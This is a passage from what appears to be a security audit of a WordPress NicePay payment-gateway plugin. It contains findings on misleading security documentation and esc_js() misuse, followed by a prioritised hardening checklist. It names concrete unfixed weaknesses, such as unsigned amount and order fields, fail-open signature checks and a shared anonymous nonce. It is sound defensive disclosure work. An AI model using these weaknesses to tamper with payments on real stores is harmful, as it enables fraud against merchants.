| ARCHITECTURE.md:351 "Every request and response is verified using SHA-256 hashing" | Net-cancel responses are never verified ([api.php:319-323](../../includes/class-nicepay-api.php#L319)); cancel responses only conditionally ([384-391](../../includes/class-nicepay-api.php#L384)) — SECURITY-06 |
| README.md:204 "All transactions use SHA-256 signature verification (request and response)" | Same |
| ARCHITECTURE.md:389 "Input Validation: `sanitize_text_field()`, `esc_attr()`, `absint()` on **all** inputs" | `button_color` reaches a `style` attribute unvalidated ([standalone-payment-form.php:55](../../templates/standalone-payment-form.php#L55)) — SECURITY-12 |
| ARCHITECTURE.md:388 "CSRF Protection: WordPress nonce verification on admin AJAX actions" | Omits that the highest-risk endpoint is a `nopriv` handler whose nonce is a shared anonymous constant — SECURITY-03, SECURITY-07 |

The second sentence of ARCHITECTURE.md:351 — "The merchant key is never sent over the network — it's only used to compute signatures locally" — **is** accurate and worth keeping.

**Impact.** Security documentation is load-bearing: a merchant's compliance reviewer, or a developer extending the plugin, will take these claims at face value and skip exactly the checks that are missing. Most importantly, **nothing anywhere in the docs tells the implementer that `Moid` and the order binding are NOT covered by any signature** and must be validated by the merchant — which is the root of SECURITY-01.

**Recommendation.** Fix the code first, then make the documentation describe the actual trust model: state explicitly which fields each signature covers and — critically — which it does not. Add a "Threat model and merchant responsibilities" section covering HTTPS enforcement, the test-vs-live key distinction, log placement, and the fact that the browser controls the return POST body. Replace "all inputs are sanitized" with a specific list of what is validated where.

**Credit:** [DEVELOPER-GUIDE.md:450-457](../../docs/DEVELOPER-GUIDE.md#L450) documents the `option_nicepay_live_merchant_key` filter for wp-config-based credentials, and this genuinely works — WordPress applies the `option_{$option}` filter inside `get_option()`, which is what [api.php:31](../../includes/class-nicepay-api.php#L31) calls. That advice is sound and should be promoted.

**Spec:** §3. **Effort:** small.

---

### SECURITY-28 · 🔵 LOW · `esc_js()` on translated UI strings emits HTML entities into `<script>` blocks

**Files:** [templates/standalone-payment-form.php:211](../../templates/standalone-payment-form.php#L211), 213, 215, [282](../../templates/standalone-payment-form.php#L282), 287, 292, 297, 303, 305; [admin/class-nicepay-admin.php:740](../../admin/class-nicepay-admin.php#L740), 744, [788-789](../../admin/class-nicepay-admin.php#L788), 834, 837, 861, 886, 889, 895

**Category:** i18n.

**Problem.** Roughly twenty call sites embed translated strings into inline JavaScript with `esc_js()`. `esc_js()` runs `_wp_specialchars( $text, ENT_COMPAT )` before escaping quotes, so it HTML-entity-encodes `&`, `<`, `>` and `"` — correct for a quoted HTML attribute, **wrong** for a `<script>` block, where nothing subsequently decodes the entities.

```php
// templates/standalone-payment-form.php:211
errorMsg = '<?php echo esc_js( __( 'This field is required.', 'nicepay-payment-gateway' ) ); ?>';
// admin/class-nicepay-admin.php:788
if (!amount) { msgs.push('<?php echo esc_js( __( 'Amount is required', 'nicepay-payment-gateway' ) ); ?>'); valid = false; }
```

**Impact.** Cosmetic but user-facing, and it lands on error messages shown at the moment a payment fails. An English apostrophe survives (`esc_js` explicitly converts `&#039;` back), but `&` in any translation renders as `&amp;` and a double quote as `&quot;`. All four shipped `.po` files were checked: no current `msgstr` reaching these sinks contains `&` or an unescaped quote, so this is **latent** — it surfaces the first time a Turkish, Korean or Chinese translation uses quotation marks or an ampersand. It is also the wrong tool architecturally: `wp_json_encode()` is the correct way to move a PHP string into JavaScript.

**Recommendation.** Replace `esc_js( __( '…' ) )` with `wp_json_encode( __( '…' ) )` (which emits its own quotes, so drop the surrounding ones) at every inline-script call site. Better still for the two templates: collect all strings into one `wp_localize_script()` / `wp_add_inline_script()` payload and move the inline `<script>` blocks into `assets/js/nicepay.js` — that also removes the per-shortcode duplication of ~190 lines of identical JavaScript when a page carries more than one `[nicepay_payment]` shortcode.

```php
errorMsg = <?php echo wp_json_encode( __( 'This field is required.', 'nicepay-payment-gateway' ) ); ?>;
msgs.push(<?php echo wp_json_encode( __( 'Amount is required', 'nicepay-payment-gateway' ) ); ?>);
```

**Effort:** small.

---

## 5. Hardening checklist

Work top to bottom. Items in each block are independent of each other but depend on the blocks above.

### Block A — stop the money loss (do these first)

- [ ] **A1** Assert `(int) $amt === (int) nicepay_get_amount( $order->get_total(), $order->get_currency() )` after the signature gate in `handle_return()` and `NicePay_Return_Handler::process()`. → SECURITY-01
- [ ] **A2** Assert `hash_equals( $this->api->get_mid(), $mid )` in the same place. → SECURITY-01
- [ ] **A3** After `request_approval()` returns, assert the response's `Moid` and `Amt` match the order; `request_net_cancel()` and fail on mismatch. → SECURITY-01
- [ ] **A4** Derive the standalone payment amount from a saved preset (`nicepay_get_saved_shortcode()`), never from `$_POST['amount']`. → SECURITY-03
- [ ] **A5** Reject a `Moid` presented to the wrong flow's endpoint (`^WC\d+_` vs `^SP_`). → SECURITY-02
- [ ] **A6** Move the signature gate **above** the `AuthResultCode` branch in both handlers; 403 + `wp_die` on failure. → SECURITY-04
- [ ] **A7** Add a terminal-state guard (`! $order->needs_payment()`, `$transaction->status in {paid,waiting,cancelled,refunded}`) at the top of both handlers. → SECURITY-05
- [ ] **A8** Abort before `request_approval()` in the standalone handler when no transaction row matches; net-cancel and render failure. → SECURITY-08
- [ ] **A9** Reuse the existing pending transaction in `generate_payment_form()` instead of inserting a new row on every receipt-page render. → SECURITY-05

### Block B — close the fail-open paths

- [ ] **B1** Make cancel-response verification fail-closed (require `TID` + `Signature`). → SECURITY-06
- [ ] **B2** Verify the net-cancel response signature per spec §8. → SECURITY-06
- [ ] **B3** Capture `request_net_cancel()`'s return value at all four call sites; log + admin notice when a reversal fails. → SECURITY-06
- [ ] **B4** Assert `CancelAmt` in `process_refund()` before returning `true`. → SECURITY-06
- [ ] **B5** Invert the mode test: `$this->is_test_mode = ( 'live' !== get_option( 'nicepay_mode', 'test' ) );` → SECURITY-17
- [ ] **B6** Route `NICEPAY_CANCEL_URL` through `validate_nicepay_url()`. → SECURITY-20, SECURITY-21
- [ ] **B7** Add `'redirection' => 0` to all three `wp_remote_post()` calls; extract a shared `request_args()` helper. → SECURITY-22

### Block C — configuration safety and secret handling

- [ ] **C1** Add `admin_notices` for test-mode and for live-mode-without-credentials. → SECURITY-10
- [ ] **C2** Add a MID/key guard to the standalone template (admin-only notice, nothing for visitors). → SECURITY-10
- [ ] **C3** Stop echoing merchant keys into the settings HTML; use masked placeholder + "empty means unchanged". → SECURITY-11
- [ ] **C4** Add `sanitize_callback` to all eight unguarded `register_setting()` calls. → SECURITY-17
- [ ] **C5** Late-bind the AJAX nonce (or define `DONOTCACHEPAGE`) so page caching cannot break the shortcode flow. → SECURITY-07
- [ ] **C6** Fix the localised nonce action; pass explicit HTTP status codes to every `wp_send_json_error()`. → SECURITY-23

### Block D — input validation and escaping

- [ ] **D1** `sanitize_hex_color()` on `$atts['button_color']` in the template; allowlist `currency`, `display_mode`; `sanitize_html_class()` per token for `button_class`. → SECURITY-12
- [ ] **D2** Rebuild the admin modal input with `$('<input>', {…})` instead of string concatenation. → SECURITY-15
- [ ] **D3** Replace the `innerHTML` assignment in the standalone notice with `textContent`. → SECURITY-15
- [ ] **D4** Replace `esc_js()` with `wp_json_encode()` at every inline-script call site. → SECURITY-28
- [ ] **D5** Look up the transaction by `$id` (the value the nonce covers) in `ajax_cancel_transaction`; add a status guard and an explicit `$partial` flag; generate a unique cancel `Moid`. → SECURITY-18
- [ ] **D6** Guard `$sc['id']` with `isset()` in both shortcode write loops; protect `is_preset` entries from deletion. → SECURITY-24

### Block E — privacy, logging and headers

- [ ] **E1** Extend `redact_for_log()` to all PII fields; drop the `strlen > 8` condition; strip CR/LF. → SECURITY-13
- [ ] **E2** Whitelist the fields persisted into `payment_data`; stop persisting `auth_token` after approval. → SECURITY-13
- [ ] **E3** Decouple audit logging from `WP_DEBUG`; always log approvals/cancels via `wc_get_logger()`. → SECURITY-13
- [ ] **E4** Add `uninstall.php` (drop table, delete `nicepay_*` options) and privacy exporter/eraser hooks. → SECURITY-13
- [ ] **E5** Add `nocache_headers()`, `X-Robots-Tag`, `Referrer-Policy`, `X-Frame-Options` and `status_header()` to `render_result_page()`. → SECURITY-19
- [ ] **E6** Add a `REQUEST_METHOD` guard to `handle_return()`; read `$_SERVER` defensively in both handlers. → SECURITY-19
- [ ] **E7** Enforce `is_ssl()` in live mode for form render and inbound callbacks. → SECURITY-19
- [ ] **E8** Show visitors a generic failure message + correlation ID instead of the raw `WP_Error`. → SECURITY-16

### Block F — entropy, schema and structure

- [ ] **F1** `generate_moid()` → `bin2hex( random_bytes( 8 ) )`; drop the order ID from the prefix. → SECURITY-09
- [ ] **F2** Change `KEY idx_moid` to `UNIQUE KEY idx_moid`. → SECURITY-09
- [ ] **F3** Return an identical generic response for unknown-Moid and invalid-signature cases. → SECURITY-09
- [ ] **F4** Pin `validate_nicepay_url()` to port 443 and the two documented paths; normalise host case and trailing dots. → SECURITY-20
- [ ] **F5** Set `nicepay_saved_shortcodes` to autoload=no (+ upgrade migration) and cap entry count. → SECURITY-24
- [ ] **F6** Make the endpoint constants immutable class constants (or assert them at load). → SECURITY-21

### Block G — build the missing surface

- [ ] **G1** Add the VBANK deposit-notification endpoint: signature verification, source-IP allowlist (`121.133.126.10`, `121.133.126.11`, `211.33.136.39`), TID match, deposit-amount assertion, then `payment_complete()`. → SECURITY-14
- [ ] **G2** Add a daily cron to cancel expired virtual accounts and restore stock. → SECURITY-14
- [ ] **G3** Document the inbound IPs in CONFIGURATION.md. → SECURITY-14

### Block H — process and documentation

- [ ] **H1** Add PHPCS + WPCS with the `WordPress.Security` ruleset to CI. → SECURITY-26
- [ ] **H2** Commit `composer.lock`. → SECURITY-26
- [ ] **H3** Add unit tests for `validate_nicepay_url()` and `redact_for_log()`. → SECURITY-26
- [ ] **H4** Make the release ZIP the primary install method; add `ABSPATH` guards to the five test files; ship `tests/.htaccess`. → SECURITY-25
- [ ] **H5** Correct the ARCHITECTURE.md and README.md security claims; add a "Threat model and merchant responsibilities" section stating which fields the signatures do **not** cover. → SECURITY-27
